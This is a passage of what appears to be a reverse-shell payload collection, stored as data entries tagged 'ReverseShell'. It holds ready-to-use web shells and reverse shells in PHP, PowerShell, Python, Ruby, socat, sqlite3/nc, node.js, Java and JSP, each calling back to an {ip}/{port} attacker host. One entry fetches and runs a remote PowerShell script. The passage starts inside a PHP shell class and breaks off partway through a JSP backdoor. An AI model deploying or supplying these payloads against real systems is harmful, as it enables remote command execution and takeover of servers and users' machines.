                                                  '// use proc_get_status() '
                                                  'instead\n'
                                                  '                        '
                                                  '$streams = array(\n'
                                                  '                            '
                                                  "'read'   => array($socket, "
                                                  '$pipes[1], $pipes[2]), // '
                                                  'SOCKET | STDOUT | STDERR\n'
                                                  '                            '
                                                  "'write'  => null,\n"
                                                  '                            '
                                                  "'except' => null\n"
                                                  '                        );\n'
                                                  '                        '
                                                  '$num_changed_streams = '
                                                  "@stream_select($streams['read'], "
                                                  "$streams['write'], "
                                                  "$streams['except'], 0); // "
                                                  'wait for stream changes | '
                                                  'will not wait on Windows '
                                                  'OS\n'
                                                  '                        if '
                                                  '($num_changed_streams === '
                                                  'false) {\n'
                                                  '                            '
                                                  'echo "STRM_ERROR: '
                                                  'stream_select() failed\\n"; '
                                                  'break;\n'
                                                  '                        } '
                                                  'else if '
                                                  '($num_changed_streams > 0) '
                                                  '{\n'
                                                  '                            '
                                                  "if ($this->os === 'LINUX') "
                                                  '{\n'
                                                  '                                '
                                                  'if (in_array($socket  , '
                                                  "$streams['read'])) { "
                                                  '$this->rw($socket  , '
                                                  "$pipes[0], 'SOCKET', "
                                                  "'STDIN' ); } // read from "
                                                  'SOCKET and write to STDIN\n'
                                                  '                                '
                                                  'if (in_array($pipes[2], '
                                                  "$streams['read'])) { "
                                                  '$this->rw($pipes[2], '
                                                  "$socket  , 'STDERR', "
                                                  "'SOCKET'); } // read from "
                                                  'STDERR and write to SOCKET\n'
                                                  '                                '
                                                  'if (in_array($pipes[1], '
                                                  "$streams['read'])) { "
                                                  '$this->rw($pipes[1], '
                                                  "$socket  , 'STDOUT', "
                                                  "'SOCKET'); } // read from "
                                                  'STDOUT and write to SOCKET\n'
                                                  '                            '
                                                  '} else if ($this->os === '
                                                  "'WINDOWS') {\n"
                                                  '                                '
                                                  '// order is important\n'
                                                  '                                '
                                                  'if (in_array($socket, '
                                                  "$streams['read'])/*------*/) "
                                                  '{ $this->rw ($socket  , '
                                                  "$pipes[0], 'SOCKET', "
                                                  "'STDIN' ); } // read from "
                                                  'SOCKET and write to STDIN\n'
                                                  '                                '
                                                  'if (($fstat = '
                                                  'fstat($pipes[2])) && '
                                                  "$fstat['size']) { "
                                                  '$this->brw($pipes[2], '
                                                  "$socket  , 'STDERR', "
                                                  "'SOCKET'); } // read from "
                                                  'STDERR and write to SOCKET\n'
                                                  '                                '
                                                  'if (($fstat = '
                                                  'fstat($pipes[1])) && '
                                                  "$fstat['size']) { "
                                                  '$this->brw($pipes[1], '
                                                  "$socket  , 'STDOUT', "
                                                  "'SOCKET'); } // read from "
                                                  'STDOUT and write to SOCKET\n'
                                                  '                            '
                                                  '}\n'
                                                  '                        }\n'
                                                  '                    } while '
                                                  '(!$this->error);\n'
                                                  '                    // '
                                                  '------ WORK END ------\n'
                                                  '\n'
                                                  '                    foreach '
                                                  '($pipes as $pipe) {\n'
                                                  '                        '
                                                  'fclose($pipe);\n'
                                                  '                    }\n'
                                                  '                    '
                                                  'proc_close($process);\n'
                                                  '                }\n'
                                                  '                // ------ '
                                                  'SHELL END ------\n'
                                                  '\n'
                                                  '                '
                                                  'fclose($socket);\n'
                                                  '            }\n'
                                                  '            // ------ '
                                                  'SOCKET END ------\n'
                                                  '\n'
                                                  '        }\n'
                                                  '    }\n'
                                                  '}\n'
                                                  "echo '<pre>';\n"
                                                  '// change the host address '
                                                  'and/or port number as '
                                                  'necessary\n'
                                                  "$sh = new Shell('{ip}', "
                                                  '{port});\n'
                                                  '$sh->run();\n'
                                                  'unset($sh);\n'
                                                  '// garbage collector '
                                                  'requires PHP v5.3.0 or '
                                                  'greater\n'
                                                  '// @gc_collect_cycles();\n'
                                                  "echo '</pre>';\n"
                                                  '?>',
                                       'meta': ['linux',
                                                'windows',
                                                'mac',
                                                'ReverseShell'],
                                       'name': 'PHP Ivan Sincek'},
                                      {'command': '<html>\n'
                                                  '<body>\n'
                                                  '<form method="GET" '
                                                  'name="<?php echo '
                                                  "basename($_SERVER['PHP_SELF']); "
                                                  '?>">\n'
                                                  '<input type="TEXT" '
                                                  'name="cmd" id="cmd" '
                                                  'size="80">\n'
                                                  '<input type="SUBMIT" '
                                                  'value="Execute">\n'
                                                  '</form>\n'
                                                  '<pre>\n'
                                                  '<?php\n'
                                                  '    '
                                                  "if(isset($_GET['cmd']))\n"
                                                  '    {\n'
                                                  '        '
                                                  "system($_GET['cmd']);\n"
                                                  '    }\n'
                                                  '?>\n'
                                                  '</pre>\n'
                                                  '</body>\n'
                                                  '<script>document.getElementById("cmd").focus();</script>\n'
                                                  '</html>',
                                       'meta': ['linux',
                                                'windows',
                                                'mac',
                                                'ReverseShell'],
                                       'name': 'PHP cmd'},
                                      {'command': '<?php '
                                                  "if(isset($_REQUEST['cmd'])){ "
                                                  'echo "<pre>"; $cmd = '
                                                  "($_REQUEST['cmd']); "
                                                  'system($cmd); echo '
                                                  '"</pre>"; die; }?>',
                                       'meta': ['linux',
                                                'windows',
                                                'mac',
                                                'ReverseShell'],
                                       'name': 'PHP cmd 2'},
                                      {'command': '<?=`$_GET[0]`?>',
                                       'meta': ['linux',
                                                'windows',
                                                'mac',
                                                'ReverseShell'],
                                       'name': 'PHP cmd small'},
                                      {'command': 'php -r '
                                                  '\'$sock=fsockopen("{ip}",{port});exec("{shell} '
                                                  '<&3 >&3 2>&3");\'',
                                       'meta': ['linux',
                                                None,
                                                'mac',
                                                'ReverseShell'],
                                       'name': 'PHP exec'},
                                      {'command': 'php -r '
                                                  '\'$sock=fsockopen("{ip}",{port});shell_exec("{shell} '
                                                  '<&3 >&3 2>&3");\'',
                                       'meta': ['linux', 'mac', 'ReverseShell'],
                                       'name': 'PHP shell_exec'},
                                      {'command': 'php -r '
                                                  '\'$sock=fsockopen("{ip}",{port});system("{shell} '
                                                  '<&3 >&3 2>&3");\'',
                                       'meta': ['linux',
                                                'windows',
                                                'mac',
                                                'ReverseShell'],
                                       'name': 'PHP system'},
                                      {'command': 'php -r '
                                                  '\'$sock=fsockopen("{ip}",{port});passthru("{shell} '
                                                  '<&3 >&3 2>&3");\'',
                                       'meta': ['linux', 'mac', 'ReverseShell'],
                                       'name': 'PHP passthru'},
                                      {'command': 'php -r '
                                                  '\'$sock=fsockopen("{ip}",{port});`{shell} '
                                                  "<&3 >&3 2>&3`;'",
                                       'meta': ['linux',
                                                'windows',
                                                'mac',
                                                'ReverseShell'],
                                       'name': 'PHP `'},
                                      {'command': 'php -r '
                                                  '\'$sock=fsockopen("{ip}",{port});popen("{shell} '
                                                  '<&3 >&3 2>&3", "r");\'',
                                       'meta': ['linux',
                                                'windows',
                                                'mac',
                                                'ReverseShell'],
                                       'name': 'PHP popen'},
                                      {'command': 'php -r '
                                                  '\'$sock=fsockopen("{ip}",{port});$proc=proc_open("{shell}", '
                                                  'array(0=>$sock, 1=>$sock, '
                                                  "2=>$sock),$pipes);'",
                                       'meta': ['linux',
                                                'windows',
                                                'mac',
                                                'ReverseShell'],
                                       'name': 'PHP proc_open'},
                                      {'command': 'IEX(IWR '
                                                  'https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 '
                                                  '-UseBasicParsing); '
                                                  'Invoke-ConPtyShell {ip} '
                                                  '{port}',
                                       'meta': ['windows', 'ReverseShell'],
                                       'name': 'Windows ConPty'},
                                      {'command': '$LHOST = "{ip}"; $LPORT = '
                                                  '{port}; $TCPClient = '
                                                  'New-Object '
                                                  'Net.Sockets.TCPClient($LHOST, '
                                                  '$LPORT); $NetworkStream = '
                                                  '$TCPClient.GetStream(); '
                                                  '$StreamReader = New-Object '
                                                  'IO.StreamReader($NetworkStream); '
                                                  '$StreamWriter = New-Object '
                                                  'IO.StreamWriter($NetworkStream); '
                                                  '$StreamWriter.AutoFlush = '
                                                  '$true; $Buffer = New-Object '
                                                  'System.Byte[] 1024; while '
                                                  '($TCPClient.Connected) { '
                                                  'while '
                                                  '($NetworkStream.DataAvailable) '
                                                  '{ $RawData = '
                                                  '$NetworkStream.Read($Buffer, '
                                                  '0, $Buffer.Length); $Code = '
                                                  '([text.encoding]::UTF8).GetString($Buffer, '
                                                  '0, $RawData -1) }; if '
                                                  '($TCPClient.Connected -and '
                                                  '$Code.Length -gt 1) { '
                                                  '$Output = try { '
                                                  'Invoke-Expression ($Code) '
                                                  '2>&1 } catch { $_ }; '
                                                  '$StreamWriter.Write("$Output`n"); '
                                                  '$Code = $null } }; '
                                                  '$TCPClient.Close(); '
                                                  '$NetworkStream.Close(); '
                                                  '$StreamReader.Close(); '
                                                  '$StreamWriter.Close()',
                                       'meta': ['windows', 'ReverseShell'],
                                       'name': 'PowerShell #1'},
                                      {'command': 'powershell -nop -c "$client '
                                                  '= New-Object '
                                                  "System.Net.Sockets.TCPClient('{ip}',{port});$stream "
                                                  '= '
                                                  '$client.GetStream();[byte[]]$bytes '
                                                  '= 0..65535|%{0};while(($i = '
                                                  '$stream.Read($bytes, 0, '
                                                  '$bytes.Length)) -ne '
                                                  '0){;$data = (New-Object '
                                                  '-TypeName '
                                                  'System.Text.ASCIIEncoding).GetString($bytes,0, '
                                                  '$i);$sendback = (iex $data '
                                                  '2>&1 | Out-String '
                                                  ');$sendback2 = $sendback + '
                                                  "'PS ' + (pwd).Path + '> "
                                                  "';$sendbyte = "
                                                  '([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"',
                                       'meta': ['windows', 'ReverseShell'],
                                       'name': 'PowerShell #2'},
                                      {'command': 'powershell -nop -W hidden '
                                                  '-noni -ep bypass -c '
                                                  '"$TCPClient = New-Object '
                                                  "Net.Sockets.TCPClient('{ip}', "
                                                  '{port});$NetworkStream = '
                                                  '$TCPClient.GetStream();$StreamWriter '
                                                  '= New-Object '
                                                  'IO.StreamWriter($NetworkStream);function '
                                                  'WriteToStream ($String) '
                                                  '{[byte[]]$script:Buffer = '
                                                  '0..$TCPClient.ReceiveBufferSize '
                                                  '| % '
                                                  '{0};$StreamWriter.Write($String '
                                                  "+ 'SHELL> "
                                                  "');$StreamWriter.Flush()}WriteToStream "
                                                  "'';while(($BytesRead = "
                                                  '$NetworkStream.Read($Buffer, '
                                                  '0, $Buffer.Length)) -gt 0) '
                                                  '{$Command = '
                                                  '([text.encoding]::UTF8).GetString($Buffer, '
                                                  '0, $BytesRead - 1);$Output '
                                                  '= try {Invoke-Expression '
                                                  '$Command 2>&1 | Out-String} '
                                                  'catch {$_ | '
                                                  'Out-String}WriteToStream '
                                                  '($Output)}$StreamWriter.Close()"',
                                       'meta': ['windows', 'ReverseShell'],
                                       'name': 'PowerShell #3'},
                                      {'command': '$sslProtocols = '
                                                  '[System.Security.Authentication.SslProtocols]::Tls12; '
                                                  '$TCPClient = New-Object '
                                                  "Net.Sockets.TCPClient('{ip}', "
                                                  '{port});$NetworkStream = '
                                                  '$TCPClient.GetStream();$SslStream '
                                                  '= New-Object '
                                                  'Net.Security.SslStream($NetworkStream,$false,({$true} '
                                                  '-as '
                                                  "[Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$sslProtocols,$false);if(!$SslStream.IsEncrypted "
                                                  '-or !$SslStream.IsSigned) '
                                                  '{$SslStream.Close();exit}$StreamWriter '
                                                  '= New-Object '
                                                  'IO.StreamWriter($SslStream);function '
                                                  'WriteToStream ($String) '
                                                  '{[byte[]]$script:Buffer = '
                                                  'New-Object System.Byte[] '
                                                  '4096 '
                                                  ';$StreamWriter.Write($String '
                                                  "+ 'SHELL> "
                                                  "');$StreamWriter.Flush()};WriteToStream "
                                                  "'';while(($BytesRead = "
                                                  '$SslStream.Read($Buffer, 0, '
                                                  '$Buffer.Length)) -gt 0) '
                                                  '{$Command = '
                                                  '([text.encoding]::UTF8).GetString($Buffer, '
                                                  '0, $BytesRead - 1);$Output '
                                                  '= try {Invoke-Expression '
                                                  '$Command 2>&1 | Out-String} '
                                                  'catch {$_ | '
                                                  'Out-String}WriteToStream '
                                                  '($Output)}$StreamWriter.Close()',
                                       'meta': ['windows', 'ReverseShell'],
                                       'name': 'PowerShell #4 (TLS)'},
                                      {'meta': ['windows', 'ReverseShell'],
                                       'name': 'PowerShell #3 (Base64)'},
                                      {'command': 'export RHOST="{ip}";export '
                                                  'RPORT={port};python -c '
                                                  "'import "
                                                  'sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) '
                                                  'for fd in '
                                                  '(0,1,2)];pty.spawn("{shell}")\'',
                                       'meta': ['linux', 'mac', 'ReverseShell'],
                                       'name': 'Python #1'},
                                      {'command': "python -c 'import "
                                                  'socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); '
                                                  'os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import '
                                                  'pty; pty.spawn("{shell}")\'',
                                       'meta': ['linux', 'mac', 'ReverseShell'],
                                       'name': 'Python #2'},
                                      {'command': 'export RHOST="{ip}";export '
                                                  'RPORT={port};python3 -c '
                                                  "'import "
                                                  'sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) '
                                                  'for fd in '
                                                  '(0,1,2)];pty.spawn("{shell}")\'',
                                       'meta': ['linux', 'mac', 'ReverseShell'],
                                       'name': 'Python3 #1'},
                                      {'command': "python3 -c 'import "
                                                  'socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); '
                                                  'os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import '
                                                  'pty; pty.spawn("{shell}")\'',
                                       'meta': ['linux', 'mac', 'ReverseShell'],
                                       'name': 'Python3 #2'},
                                      {'command': 'import '
                                                  'os,socket,subprocess,threading;\n'
                                                  'def s2p(s, p):\n'
                                                  '    while True:\n'
                                                  '        data = '
                                                  's.recv(1024)\n'
                                                  '        if len(data) > 0:\n'
                                                  '            '
                                                  'p.stdin.write(data)\n'
                                                  '            '
                                                  'p.stdin.flush()\n'
                                                  '\n'
                                                  'def p2s(s, p):\n'
                                                  '    while True:\n'
                                                  '        '
                                                  's.send(p.stdout.read(1))\n'
                                                  '\n'
                                                  's=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n'
                                                  's.connect(("{ip}",{port}))\n'
                                                  '\n'
                                                  'p=subprocess.Popen(["{shell}"], '
                                                  'stdout=subprocess.PIPE, '
                                                  'stderr=subprocess.STDOUT, '
                                                  'stdin=subprocess.PIPE)\n'
                                                  '\n'
                                                  's2p_thread = '
                                                  'threading.Thread(target=s2p, '
                                                  'args=[s, p])\n'
                                                  's2p_thread.daemon = True\n'
                                                  's2p_thread.start()\n'
                                                  '\n'
                                                  'p2s_thread = '
                                                  'threading.Thread(target=p2s, '
                                                  'args=[s, p])\n'
                                                  'p2s_thread.daemon = True\n'
                                                  'p2s_thread.start()\n'
                                                  '\n'
                                                  'try:\n'
                                                  '    p.wait()\n'
                                                  'except KeyboardInterrupt:\n'
                                                  '    s.close()',
                                       'meta': ['windows', 'ReverseShell'],
                                       'name': 'Python3 Windows'},
                                      {'command': "python3 -c 'import "
                                                  'os,pty,socket;s=socket.socket();s.connect(("{ip}",{port}));[os.dup2(s.fileno(),f)for '
                                                  'f '
                                                  'in(0,1,2)];pty.spawn("{shell}")\'',
                                       'meta': ['linux', 'ReverseShell'],
                                       'name': 'Python3 shortest'},
                                      {'command': 'ruby -rsocket '
                                                  '-e\'spawn("sh",[:in,:out,:err]=>TCPSocket.new("{ip}",{port}))\'',
                                       'meta': ['linux', 'mac', 'ReverseShell'],
                                       'name': 'Ruby #1'},
                                      {'command': "ruby -rsocket -e'exit if "
                                                  'fork;c=TCPSocket.new("{ip}","{port}");loop{c.gets.chomp!;(exit! '
                                                  'if $_=="exit");($_=~/cd '
                                                  '(.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print '
                                                  'io.read}))rescue c.puts '
                                                  '"failed: #{$_}"}\'',
                                       'meta': ['linux', 'mac', 'ReverseShell'],
                                       'name': 'Ruby no sh'},
                                      {'command': 'socat TCP:{ip}:{port} '
                                                  'EXEC:{shell}',
                                       'meta': ['linux', 'mac', 'ReverseShell'],
                                       'name': 'socat #1'},
                                      {'command': 'socat TCP:{ip}:{port} '
                                                  "EXEC:'{shell}',pty,stderr,setsid,sigint,sane",
                                       'meta': ['linux', 'mac', 'ReverseShell'],
                                       'name': 'socat #2 (TTY)'},
                                      {'command': "sqlite3 /dev/null '.shell "
                                                  'rm /tmp/f;mkfifo /tmp/f;cat '
                                                  '/tmp/f|{shell} -i 2>&1|nc '
                                                  "{ip} {port} >/tmp/f'",
                                       'meta': ['linux', 'mac', 'ReverseShell'],
                                       'name': 'sqlite3 nc mkfifo'},
                                      {'command': "require('child_process').exec('nc "
                                                  "-e {shell} {ip} {port}')",
                                       'meta': ['linux', 'mac', 'ReverseShell'],
                                       'name': 'node.js'},
                                      {'command': '(function(){\r\n'
                                                  '    var net = '
                                                  'require("net"),\r\n'
                                                  '        cp = '
                                                  'require("child_process"),\r\n'
                                                  '        sh = '
                                                  'cp.spawn("{shell}", []);\r\n'
                                                  '    var client = new '
                                                  'net.Socket();\r\n'
                                                  '    client.connect({port}, '
                                                  '"{ip}", function(){\r\n'
                                                  '        '
                                                  'client.pipe(sh.stdin);\r\n'
                                                  '        '
                                                  'sh.stdout.pipe(client);\r\n'
                                                  '        '
                                                  'sh.stderr.pipe(client);\r\n'
                                                  '    });\r\n'
                                                  '    return /a/; // Prevents '
                                                  'the Node.js application '
                                                  'from crashing\r\n'
                                                  '})();',
                                       'meta': ['linux',
                                                'mac',
                                                'windows',
                                                'ReverseShell'],
                                       'name': 'node.js #2'},
                                      {'command': 'public class shell {\n'
                                                  '    public static void '
                                                  'main(String[] args) {\n'
                                                  '        Process p;\n'
                                                  '        try {\n'
                                                  '            p = '
                                                  'Runtime.getRuntime().exec("bash '
                                                  '-c $@|bash 0 echo bash -i '
                                                  '>& /dev/tcp/{ip}/{port} '
                                                  '0>&1");\n'
                                                  '            p.waitFor();\n'
                                                  '            p.destroy();\n'
                                                  '        } catch (Exception '
                                                  'e) {}\n'
                                                  '    }\n'
                                                  '}',
                                       'meta': ['linux', 'mac', 'ReverseShell'],
                                       'name': 'Java #1'},
                                      {'command': 'public class shell {\n'
                                                  '    public static void '
                                                  'main(String[] args) {\n'
                                                  '        ProcessBuilder pb = '
                                                  'new ProcessBuilder("bash", '
                                                  '"-c", "$@| bash -i >& '
                                                  '/dev/tcp/{ip}/{port} '
                                                  '0>&1")\n'
                                                  '            '
                                                  '.redirectErrorStream(true);\n'
                                                  '        try {\n'
                                                  '            Process p = '
                                                  'pb.start();\n'
                                                  '            p.waitFor();\n'
                                                  '            p.destroy();\n'
                                                  '        } catch (Exception '
                                                  'e) {}\n'
                                                  '    }\n'
                                                  '}',
                                       'meta': ['linux', 'mac', 'ReverseShell'],
                                       'name': 'Java #2'},
                                      {'command': 'import '
                                                  'java.io.InputStream;\n'
                                                  'import '
                                                  'java.io.OutputStream;\n'
                                                  'import java.net.Socket;\n'
                                                  '\n'
                                                  'public class shell {\n'
                                                  '    public static void '
                                                  'main(String[] args) {\n'
                                                  '        String host = '
                                                  '"{ip}";\n'
                                                  '        int port = {port};\n'
                                                  '        String cmd = '
                                                  '"{shell}";\n'
                                                  '        try {\n'
                                                  '            Process p = new '
                                                  'ProcessBuilder(cmd).redirectErrorStream(true).start();\n'
                                                  '            Socket s = new '
                                                  'Socket(host, port);\n'
                                                  '            InputStream pi '
                                                  '= p.getInputStream(), pe = '
                                                  'p.getErrorStream(), si = '
                                                  's.getInputStream();\n'
                                                  '            OutputStream po '
                                                  '= p.getOutputStream(), so = '
                                                  's.getOutputStream();\n'
                                                  '            while '
                                                  '(!s.isClosed()) {\n'
                                                  '                while '
                                                  '(pi.available() > 0)\n'
                                                  '                    '
                                                  'so.write(pi.read());\n'
                                                  '                while '
                                                  '(pe.available() > 0)\n'
                                                  '                    '
                                                  'so.write(pe.read());\n'
                                                  '                while '
                                                  '(si.available() > 0)\n'
                                                  '                    '
                                                  'po.write(si.read());\n'
                                                  '                '
                                                  'so.flush();\n'
                                                  '                '
                                                  'po.flush();\n'
                                                  '                '
                                                  'Thread.sleep(50);\n'
                                                  '                try {\n'
                                                  '                    '
                                                  'p.exitValue();\n'
                                                  '                    break;\n'
                                                  '                } catch '
                                                  '(Exception e) {}\n'
                                                  '            }\n'
                                                  '            p.destroy();\n'
                                                  '            s.close();\n'
                                                  '        } catch (Exception '
                                                  'e) {}\n'
                                                  '    }\n'
                                                  '}',
                                       'meta': ['windows',
                                                'linux',
                                                'mac',
                                                'ReverseShell'],
                                       'name': 'Java #3'},
                                      {'command': '<%@\r\n'
                                                  'page import="java.lang.*, '
                                                  'java.util.*, java.io.*, '
                                                  'java.net.*"\r\n'
                                                  '% >\r\n'
                                                  '<%!\r\n'
                                                  'static class '
                                                  'StreamConnector extends '
                                                  'Thread\r\n'
                                                  '{\r\n'
                                                  '        InputStream is;\r\n'
                                                  '        OutputStream os;\r\n'
                                                  '        '
                                                  'StreamConnector(InputStream '
                                                  'is, OutputStream os)\r\n'
                                                  '        {\r\n'
                                                  '                this.is = '
                                                  'is;\r\n'
                                                  '                this.os = '
                                                  'os;\r\n'
                                                  '        }\r\n'
                                                  '        public void '
                                                  'run()\r\n'
                                                  '        {\r\n'
                                                  '                '
                                                  'BufferedReader isr = '
                                                  'null;\r\n'
                                                  '                '
                                                  'BufferedWriter osw = '
                                                  'null;\r\n'
                                                  '                try\r\n'
                                                  '                {\r\n'
                                                  '                        isr '
                                                  '= new BufferedReader(new '
                                                  'InputStreamReader(is));\r\n'
                                                  '                        osw '
                                                  '= new BufferedWriter(new '
                                                  'OutputStreamWriter(os));\r\n'
                                                  '                        '
                                                  'char buffer[] = new '
                                                  'char[8192];\r\n'
                                                  '                        int '
                                                  'lenRead;\r\n'
                                                  '                        '
                                                  'while( (lenRead = '
                                                  'isr.read(buffer, 0, '
                                                  'buffer.length)) > 0)\r\n'
                                                  '                        '
                                                  '{\r\n'
                                                  '                                '
                                                  'osw.write(buffer, 0, '
                                                  'lenRead);\r\n'
                                                  '                                '
                                                  'osw.flush();\r\n'
                                                  '                        '
                                                  '}\r\n'
                                                  '                }\r\n'
                                                  '                catch '
                                                  '(Exception ioe)\r\n'
                                                  '                try\r\n'
                                                  '                {\r\n'
                                                  '                        '
                                                  'if(isr != null) '
                                                  'isr.close();\r\n'
                                                  '                        '
                                                  'if(osw != null) '
                                                  'osw.close();\r\n'
                                                  '                }\r\n'
                                                  '                catch '
                                                  '(Exception ioe)\r\n'
                                                  '        }\r\n'
                                                  '}\r\n'
                                                  '%>\r\n'
                                                  '\r\n'
                                                  '<h1>JSP Backdoor Reverse '
                                                  'Shell</h1>\r\n'
                                                  '\r\n'
                                                  '<form method="post">\r\n'
                                                  'IP Address\r\n'
                                                  '<input type="text" '
                                                  'name="ipaddress" '
                                                  'size=30>\r\n'
                                                  'Port\r\n'
                                                  '<input type="text" '
                                                  'name="port" size=10>\r\n'
                                                  '<input type="submit" '
                                                  'name="Connect" '
                                                  'value="Connect">\r\n'
                                                  '</form>\r\n'
                                                  '<p>\r\n'
                                                  '<hr>\r\n'
                                                  '\r\n'
                                                  '<%\r\n'
                                                  'String ipAddress = '
                                                  'request.getParameter("ipaddress");\r\n'
                                                  'String ipPort = '
                                                  'request.getParameter("port");\r\n'
                                                  'if(ipAddress != null && '
                                                  'ipPort != null)\r\n'
                                                  '{\r\n'
                                                  '        Socket sock = '
                                                  'null;\r\n'
                                                  '        try\r\n'
                                                  '        {\r\n'
                                                  '                sock = new '
                                                  'Socket(ipAddress, (new '
                                                  'Integer(ipPort)).intValue());\r\n'
                                                  '                Runtime rt '
                                                  '= Runtime.getRuntime();\r\n'
                                                  '                Process '
                                                  'proc = '
                                                  'rt.exec("cmd.exe");\r\n'
                                                  '                '
                                                  'StreamConnector '
                                                  'outputConnector =\r\n'
                                                  '                        new '
                                                  'StreamConnector(proc.getInputStream(),\r\n'
                                                  '                                          '
                                                  'sock.getOutputStream());\r\n'
                                                  '                '
                                                  'StreamConnector '
                                                  'inputConnector =\r\n'
                                                  '                        new '
                                                  'StreamConnector(sock.getInputStream(),\r\n'
                                                  '                                          '
                                                  'proc.getOutputStream());\r\n'
                                                  '                '
                                                  'outputConnector.start();\r\n'
                                                  '                '
                                                  'inputConnector.start();\r\n'
                                                  '        }\r\n'
                                                  '        catch(Exception '
                                                  'e) \r\n'
                                                  '}\r\n'
                                                  '%>',
                                       'meta': ['windows',
                                                'linux',
                                                'mac',
                                                'ReverseShell'],
                                       'name': 'Java Web'},
                                      {'command': '<%\r\n'
                                                  '    /*\r\n'
                                                  '     * Usage: This is a 2 '
                                                  'way shell, one web shell '
                                                  'and a reverse shell. First, '
                                                  'it will try to connect to a '
                                                  'listener (atacker machine), '
                                                  'with the IP and Port '
                                                  'specified at the end of the '
                                                  'file.\r\n'
                                                  '     * If it cannot '
                                                  'connect, an HTML will '
                                                  'prompt and you can input '
                                                  'commands (sh/cmd) there and '
                                                  'it will prompts the output '
                                                  'in the HTML.\r\n'
                                                  '     * Note that this last '
                                                  'functionality is slow, so '
                                                  'the first one (reverse '
                                                  'shell) is recommended. Each '
                                                  'time the button "send" is '
                                                  'clicked, it will try to '
                                                  'connect to the reverse '
                                                  'shell again (apart from '
                                                  'executing \r\n'
                                                  '     * the command '
                                                  'specified in the HTML '
                                                  'form). This is to avoid to '
                                                  'keep it simple.\r\n'
                                                  '     */\r\n'
                                                  '%>\r\n'
                                                  '\r\n'
                                                  '<%@page '
                                                  'import="java.lang.*"%>\r\n'
                                                  '<%@page '
                                                  'import="java.io.*"%>\r\n'
                                                  '<%@page '
                                                  'import="java.net.*"%>\r\n'
                                                  '<%@page '
                                                  'import="java.util.*"%>\r\n'
                                                  '\r\n'
                                                  '<html>\r\n'
                                                  '<head>\r\n'
                                                  '    '
                                                  '<title>jrshell</title>\r\n'
                                                  '</head>\r\n'
                                                  '<body>\r\n'
                                                  '<form METHOD="POST" '
                                                  'NAME="myform" ACTION="">\r\n'
                                                  '    <input TYPE="text" '
                                                  'NAME="shell">\r\n'
                                                  '    <input TYPE="submit" '
                                                  'VALUE="Send">\r\n'
                                                  '</form>\r\n'
                                                  '<pre>\r\n'
                                                  '<%\r\n'
                                                  '    // Define the OS\r\n'
                                                  '    String shellPath = '
                                                  'null;\r\n'
                                                  '    try\r\n'
                                                  '    {\r\n'
                                                  '        if '
                                                  '(System.getProperty("os.name").toLowerCase().indexOf("windows") '
                                                  '== -1) {\r\n'
                                                  '            shellPath = new '
                                                  'String("/bin/sh");\r\n'
                                                  '        } else {\r\n'
                                                  '            shellPath = new '
                                                  'String("cmd.exe");\r\n'
                                                  '        }\r\n'
                                                  '    } catch( Exception e '
                                                  '){}\r\n'
                                                  '    // INNER HTML PART\r\n'
                                                  '    if '
                                                  '(request.getParameter("shell") '
                                                  '!= null) {\r\n'
                                                  '        '
                                                  'out.println("Command: " + '
                                                  'request.getParameter("shell") '
                                                  '+ "\\n<BR>");\r\n'
                                                  '        Process p;\r\n'
                                                  '        if '
                                                  '(shellPath.equals("cmd.exe"))\r\n'
                                                  '            p = '
                                                  'Runtime.getRuntime().exec("cmd.exe '
                                                  '/c " + '
                                                  'request.getParameter("shell"));\r\n'
                                                  '        else\r\n'
                                                  '            p = '
                                                  'Runtime.getRuntime().exec("/bin/sh '
                                                  '-c " + '
                                                  'request.getParameter("shell"));\r\n'
                                                  '        OutputStream os = '
                                                  'p.getOutputStream();\r\n'
                                                  '        InputStream in = '
                                                  'p.getInputStream();\r\n'
                                                  '        DataInputStream dis '
                                                  '= new '
                                                  'DataInputStream(in);\r\n'
                                                  '        String disr = '
                                                  'dis.readLine();\r\n'
                                                  '        while ( disr != '
                                                  'null ) {\r\n'
                                                  '            '
                                                  'out.println(disr);\r\n'
                                                  '            disr = '
                                                  'dis.readLine();\r\n'
                                                  '        }\r\n'
                                                  '    }\r\n'
                                                  '    // TCP PORT PART\r\n'
                                                  '    class StreamConnector '
                                                  'extends Thread\r\n'
                                                  '    {\r\n'
                                                  '        InputStream wz;\r\n'
                                                  '        OutputStream yr;\r\n'
                                                  '        StreamConnector( '
                                                  'InputStream wz, '
                                                  'OutputStream yr ) {\r\n'
                                                  '            this.wz = '
                                                  'wz;\r\n'
                                                  '            this.yr = '
                                                  'yr;\r\n'
                                                  '        }\r\n'
                                                  '        public void '
                                                  'run()\r\n'
                                                  '        {\r\n'
                                                  '            BufferedReader '
                                                  'r  = null;\r\n'
                                                  '            BufferedWriter '
                                                  'w = null;\r\n'
                                                  '            try\r\n'
                                                  '            {\r\n'
                                                  '                r  = new '
                                                  'BufferedReader(new '
                                                  'InputStreamReader(wz));\r\n'
                                                  '                w = new '
                                                  'BufferedWriter(new '
                                                  'OutputStreamWriter(yr));\r\n'
                                                  '                char '
                                                  'buffer[] = new '
                                                  'char[8192];\r\n'
                                                  '                int '
                                                  'length;\r\n'
                                                  '                while( ( '
                                                  'length = r.read( buffer, 0, '
                                                  'buffer.length ) ) > 0 )\r\n'
                                                  '                {\r\n'
                                                  '                    '
                                                  'w.write( buffer, 0, length '
                                                  ');\r\n'
                                                  '                    '
                                                  'w.flush();\r\n'
                                                  '                }\r\n'
                                                  '            } catch( '
                                                  'Exception e ){}\r\n'
                                                  '            try\r\n'
                                                  '            {\r\n'
                                                  '                if( r != '
                                                  'null )\r\n'
                                                  '                    '
                                                  'r.close();\r\n'
                                                  '                if( w != '
